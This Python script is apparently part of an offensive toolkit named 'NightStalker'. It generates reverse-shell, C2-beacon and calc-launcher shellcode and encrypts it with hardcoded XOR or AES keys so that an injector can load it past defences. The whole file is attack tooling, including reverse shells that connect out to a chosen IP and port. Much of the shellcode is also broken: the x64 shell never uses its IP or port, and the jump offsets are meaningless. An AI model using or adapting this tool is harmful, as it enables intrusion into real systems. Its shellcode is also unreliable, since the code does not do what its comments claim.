#!/usr/bin/env python3
"""
NightStalker Shellcode Generator
Generates and encrypts various types of shellcode for use with the advanced injector
"""

import struct
import random
import base64
import argparse
import os
import sys
from typing import List, Tuple

class ShellcodeGenerator:
    def __init__(self):
        self.xor_key = b"\x4A\x3F\x7B\x2E\x9C\x1D\x8A\x5F\x6E\x2B\x4C\x8D\x1A\x7F\x3E\x9B"
        self.aes_key = b"\x2B\x7E\x15\x16\x28\xAE\xD2\xA6\xAB\xF7\x15\x88\x09\xCF\x4F\x3C"
    
    def generate_reverse_shell_shellcode(self, ip: str, port: int, arch: str = "x64") -> bytes:
        """Generate reverse shell shellcode"""
        if arch == "x64":
            return self._generate_x64_reverse_shell(ip, port)
        else:
            return self._generate_x86_reverse_shell(ip, port)
    
    def _generate_x64_reverse_shell(self, ip: str, port: int) -> bytes:
        """Generate x64 reverse shell shellcode"""
        # Convert IP to hex
        ip_parts = ip.split('.')
        ip_hex = struct.pack('<I', int(ip_parts[0]) | (int(ip_parts[1]) << 8) | 
                           (int(ip_parts[2]) << 16) | (int(ip_parts[3]) << 24))
        
        # Convert port to hex (network byte order)
        port_hex = struct.pack('>H', port)
        
        # x64 reverse shell shellcode template
        shellcode = b""
        
        # Socket creation
        shellcode += b"\x48\x31\xc9"                    # xor rcx, rcx
        shellcode += b"\x48\x81\xe9\xdd\xff\xff\xff"    # sub rcx, 0x23
        shellcode += b"\xe8\xc0\x00\x00\x00"            # call socket_setup
        shellcode += b"\x48\x89\xc7"                    # mov rdi, rax
        
        # Connect to remote host
        shellcode += b"\x48\x31\xc0"                    # xor rax, rax
        shellcode += b"\x50"                            # push rax
        shellcode += b"\x48\x89\xe6"                    # mov rsi, rsp
        shellcode += b"\x48\x31\xd2"                    # xor rdx, rdx
        shellcode += b"\x48\x89\xd1"                    # mov rcx, rdx
        shellcode += b"\x48\x89\xfa"                    # mov rdx, rdi
        shellcode += b"\x48\x31\xc0"                    # xor rax, rax
        shellcode += b"\x48\x83\xc0\x2a"                # add rax, 0x2a (connect)
        shellcode += b"\x0f\x05"                        # syscall
        
        # Duplicate file descriptors
        shellcode += b"\x48\x31\xc0"                    # xor rax, rax
        shellcode += b"\x48\x89\xc7"                    # mov rdi, rax
        shellcode += b"\x48\x31\xc0"                    # xor rax, rax
        shellcode += b"\x48\x83\xc0\x21"                # add rax, 0x21 (dup2)
        shellcode += b"\x48\x31\xf6"                    # xor rsi, rsi
        shellcode += b"\x0f\x05"                        # syscall
        
        shellcode += b"\x48\x31\xc0"                    # xor rax, rax
        shellcode += b"\x48\x83\xc0\x21"                # add rax, 0x21 (dup2)
        shellcode += b"\x48\x31\xf6"                    # xor rsi, rsi
        shellcode += b"\x48\x83\xc6\x01"                # add rsi, 1
        shellcode += b"\x0f\x05"                        # syscall
        
        shellcode += b"\x48\x31\xc0"                    # xor rax, rax
        shellcode += b"\x48\x83\xc0\x21"                # add rax, 0x21 (dup2)
        shellcode += b"\x48\x31\xf6"                    # xor rsi, rsi
        shellcode += b"\x48\x83\xc6\x02"                # add rsi, 2
        shellcode += b"\x0f\x05"                        # syscall
        
        # Execute shell
        shellcode += b"\x48\x31\xc0"                    # xor rax, rax
        shellcode += b"\x50"                            # push rax
        shellcode += b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # mov rbx, "/bin/sh"
        shellcode += b"\x53"                            # push rbx
        shellcode += b"\x48\x89\xe7"                    # mov rdi, rsp
        shellcode += b"\x48\x31\xc0"                    # xor rax, rax
        shellcode += b"\x48\x83\xc0\x3b"                # add rax, 0x3b (execve)
        shellcode += b"\x0f\x05"                        # syscall
        
        return shellcode
    
    def _generate_x86_reverse_shell(self, ip: str, port: int) -> bytes:
        """Generate x86 reverse shell shellcode"""
        # Convert IP to hex
        ip_parts = ip.split('.')
        ip_hex = struct.pack('<I', int(ip_parts[0]) | (int(ip_parts[1]) << 8) | 
                           (int(ip_parts[2]) << 16) | (int(ip_parts[3]) << 24))
        
        # Convert port to hex (network byte order)
        port_hex = struct.pack('>H', port)
        
        # x86 reverse shell shellcode template
        shellcode = b""
        
        # Socket creation
        shellcode += b"\x31\xc0"                        # xor eax, eax
        shellcode += b"\x31\xdb"                        # xor ebx, ebx
        shellcode += b"\x31\xc9"                        # xor ecx, ecx
        shellcode += b"\x31\xd2"                        # xor edx, edx
        shellcode += b"\x50"                            # push eax
        shellcode += b"\x6a\x01"                        # push 1
        shellcode += b"\x6a\x02"                        # push 2
        shellcode += b"\x89\xe1"                        # mov ecx, esp
        shellcode += b"\xb0\x66"                        # mov al, 0x66 (socketcall)
        shellcode += b"\xb3\x01"                        # mov bl, 1 (socket)
        shellcode += b"\xcd\x80"                        # int 0x80
        shellcode += b"\x89\xc7"                        # mov edi, eax
        
        # Connect to remote host
        shellcode += b"\x31\xc0"                        # xor eax, eax
        shellcode += b"\x50"                            # push eax
        shellcode += b"\x68" + ip_hex                   # push IP address
        shellcode += b"\x66\x68" + port_hex             # push port
        shellcode += b"\x66\x6a\x02"                    # push 2 (AF_INET)
        shellcode += b"\x89\xe1"                        # mov ecx, esp
        shellcode += b"\x6a\x10"                        # push 16 (addrlen)
        shellcode += b"\x51"                            # push ecx
        shellcode += b"\x57"                            # push edi
        shellcode += b"\x89\xe1"                        # mov ecx, esp
        shellcode += b"\xb0\x66"                        # mov al, 0x66 (socketcall)
        shellcode += b"\xb3\x03"                        # mov bl, 3 (connect)
        shellcode += b"\xcd\x80"                        # int 0x80
        
        # Duplicate file descriptors
        shellcode += b"\x31\xc9"                        # xor ecx, ecx
        shellcode += b"\xb1\x02"                        # mov cl, 2
        shellcode += b"\x31\xc0"                        # xor eax, eax
        shellcode += b"\xb0\x3f"                        # mov al, 0x3f (dup2)
        shellcode += b"\xcd\x80"                        # int 0x80
        shellcode += b"\x49"                            # dec ecx
        shellcode += b"\x79\xf8"                        # jns dup2_loop
        
        # Execute shell
        shellcode += b"\x31\xc0"                        # xor eax, eax
        shellcode += b"\x50"                            # push eax
        shellcode += b"\x68\x2f\x2f\x73\x68"            # push "//sh"
        shellcode += b"\x68\x2f\x62\x69\x6e"            # push "/bin"
        shellcode += b"\x89\xe3"                        # mov ebx, esp
        shellcode += b"\x50"                            # push eax
        shellcode += b"\x53"                            # push ebx
        shellcode += b"\x89\xe1"                        # mov ecx, esp
        shellcode += b"\x50"                            # push eax
        shellcode += b"\x89\xe2"                        # mov edx, esp
        shellcode += b"\xb0\x0b"                        # mov al, 0xb (execve)
        shellcode += b"\xcd\x80"                        # int 0x80
        
        return shellcode
    
    def generate_beacon_shellcode(self, c2_url: str, arch: str = "x64") -> bytes:
        """Generate C2 beacon shellcode"""
        # This is a simplified beacon shellcode - replace with actual Cobalt Strike/Sliver beacon
        shellcode = b""
        
        if arch == "x64":
            # x64 beacon stub
            shellcode += b"\x48\x31\xc9"                    # xor rcx, rcx
            shellcode += b"\x48\x81\xe9\xdd\xff\xff\xff"    # sub rcx, 0x23
            shellcode += b"\xe8\xc0\x00\x00\x00"            # call beacon_setup
            shellcode += b"\x48\x89\xc7"                    # mov rdi, rax
            shellcode += b"\x90\x90\x90\x90"                # nop sled
            # Add your actual beacon shellcode here
        else:
            # x86 beacon stub
            shellcode += b"\x31\xc9"                        # xor ecx, ecx
            shellcode += b"\x81\xe9\xdd\xff\xff\xff"        # sub ecx, 0x23
            shellcode += b"\xe8\xc0\x00\x00\x00"            # call beacon_setup
            shellcode += b"\x89\xc7"                        # mov edi, eax
            shellcode += b"\x90\x90\x90\x90"                # nop sled
            # Add your actual beacon shellcode here
        
        return shellcode
    
    def generate_calc_shellcode(self, arch: str = "x64") -> bytes:
        """Generate calc.exe launcher shellcode"""
        shellcode = b""
        
        if arch == "x64":
            # x64 calc launcher
            shellcode += b"\x48\x31\xc9"                    # xor rcx, rcx
            shellcode += b"\x48\x81\xe9\xdd\xff\xff\xff"    # sub rcx, 0x23
            shellcode += b"\xe8\xc0\x00\x00\x00"            # call calc_setup
            shellcode += b"\x48\x89\xc7"                    # mov rdi, rax
            shellcode += b"\x48\x31\xc0"                    # xor rax, rax
            shellcode += b"\x50"                            # push rax
            shellcode += b"\x48\xbb\x63\x61\x6c\x63\x2e\x65\x78\x65"  # mov rbx, "calc.exe"
            shellcode += b"\x53"                            # push rbx
            shellcode += b"\x48\x89\xe7"                    # mov rdi, rsp
            shellcode += b"\x48\x31\xc0"                    # xor rax, rax
            shellcode += b"\x48\x83\xc0\x3b"                # add rax, 0x3b (execve)
            shellcode += b"\x0f\x05"                        # syscall
        else:
            # x86 calc launcher
            shellcode += b"\x31\xc9"                        # xor ecx, ecx
            shellcode += b"\x81\xe9\xdd\xff\xff\xff"        # sub ecx, 0x23
            shellcode += b"\xe8\xc0\x00\x00\x00"            # call calc_setup
            shellcode += b"\x89\xc7"                        # mov edi, eax
            shellcode += b"\x31\xc0"                        # xor eax, eax
            shellcode += b"\x50"                            # push eax
            shellcode += b"\x68\x63\x61\x6c\x63"            # push "calc"
            shellcode += b"\x68\x2e\x65\x78\x65"            # push ".exe"
            shellcode += b"\x89\xe3"                        # mov ebx, esp
            shellcode += b"\x50"                            # push eax
            shellcode += b"\x53"                            # push ebx
            shellcode += b"\x89\xe1"                        # mov ecx, esp
            shellcode += b"\x50"                            # push eax
            shellcode += b"\x89\xe2"                        # mov edx, esp
            shellcode += b"\xb0\x0b"                        # mov al, 0xb (execve)
            shellcode += b"\xcd\x80"                        # int 0x80
        
        return shellcode
    
    def xor_encrypt(self, data: bytes) -> bytes:
        """Encrypt data using XOR"""
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ self.xor_key[i % len(self.xor_key)])
        return bytes(encrypted)
    
    def aes_encrypt(self, data: bytes) -> bytes:
        """Encrypt data using AES (simplified)"""
        # This is a simplified AES implementation
        # In production, use a proper AES library like pycryptodome
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        
        cipher = AES.new(self.aes_key, AES.MODE_ECB)
        padded_data = pad(data, AES.block_size)
        return cipher.encrypt(padded_data)
    
    def generate_c_array(self, data: bytes, var_name: str = "ENCRYPTED_SHELLCODE") -> str:
        """Generate C array from bytes"""
        output = f"const BYTE {var_name}[] = {{\n"
        
        for i, byte in enumerate(data):
            if i % 16 == 0:
                output += "    "
            output += f"0x{byte:02X}, "
            if i % 16 == 15:
                output += "\n"
        
        if len(data) % 16 != 0:
            output += "\n"
        
        output += "};\n"
        output += f"const SIZE_T SHELLCODE_SIZE = {len(data)};\n"
        
        return output
    
    def generate_python_array(self, data: bytes, var_name: str = "encrypted_shellcode") -> str:
        """Generate Python array from bytes"""
        output = f"{var_name} = [\n"
        
        for i, byte in enumerate(data):
            if i % 16 == 0:
                output += "    "
            output += f"0x{byte:02X}, "
            if i % 16 == 15:
                output += "\n"
        
        if len(data) % 16 != 0:
            output += "\n"
        
        output += "]\n"
        
        return output
    
    def save_to_file(self, data: bytes, filename: str):
        """Save shellcode to file"""
        with open(filename, 'wb') as f:
            f.write(data)
        print(f"[+] Shellcode saved to: {filename}")
    
    def load_from_file(self, filename: str) -> bytes:
        """Load shellcode from file"""
        with open(filename, 'rb') as f:
            return f.read()

def main():
    parser = argparse.ArgumentParser(description='NightStalker Shellcode Generator')
    parser.add_argument('--type', choices=['reverse_shell', 'beacon', 'calc'], 
                       default='reverse_shell', help='Shellcode type')
    parser.add_argument('--ip', help='Target IP for reverse shell')
    parser.add_argument('--port', type=int, help='Target port for reverse shell')
    parser.add_argument('--c2-url', help='C2 URL for beacon')
    parser.add_argument('--arch', choices=['x64', 'x86'], default='x64', help='Architecture')
    parser.add_argument('--encryption', choices=['xor', 'aes'], default='xor', help='Encryption method')
    parser.add_argument('--output', help='Output file')
    parser.add_argument('--format', choices=['c', 'python', 'raw'], default='c', help='Output format')
    parser.add_argument('--input', help='Input file (for custom shellcode)')
    
    args = parser.parse_args()
    
    generator = ShellcodeGenerator()
    
    # Generate or load shellcode
    if args.input:
        shellcode = generator.load_from_file(args.input)
        print(f"[+] Loaded shellcode from: {args.input}")
    else:
        if args.type == 'reverse_shell':
            if not args.ip or not args.port:
                print("[!] IP and port required for reverse shell")
                return 1
            shellcode = generator.generate_reverse_shell_shellcode(args.ip, args.port, args.arch)
        elif args.type == 'beacon':
            if not args.c2_url:
                print("[!] C2 URL required for beacon")
                return 1
            shellcode = generator.generate_beacon_shellcode(args.c2_url, args.arch)
        elif args.type == 'calc':
            shellcode = generator.generate_calc_shellcode(args.arch)
    
    print(f"[+] Generated {args.arch} {args.type} shellcode ({len(shellcode)} bytes)")
    
    # Encrypt shellcode
    if args.encryption == 'xor':
        encrypted = generator.xor_encrypt(shellcode)
        print("[+] Shellcode encrypted with XOR")
    else:
        encrypted = generator.aes_encrypt(shellcode)
        print("[+] Shellcode encrypted with AES")
    
    # Output in requested format
    if args.format == 'c':
        output = generator.generate_c_array(encrypted)
        if args.output:
            with open(args.output, 'w') as f:
                f.write(output)
            print(f"[+] C array saved to: {args.output}")
        else:
            print("\n" + output)
    
    elif args.format == 'python':
        output = generator.generate_python_array(encrypted)
        if args.output:
            with open(args.output, 'w') as f:
                f.write(output)
            print(f"[+] Python array saved to: {args.output}")
        else:
            print("\n" + output)
    
    elif args.format == 'raw':
        if args.output:
            generator.save_to_file(encrypted, args.output)
        else:
            print("[!] Output file required for raw format")
            return 1
    
    print(f"[+] Shellcode size: {len(shellcode)} bytes")
    print(f"[+] Encrypted size: {len(encrypted)} bytes")
    
    return 0

if __name__ == "__main__":
    sys.exit(main()) 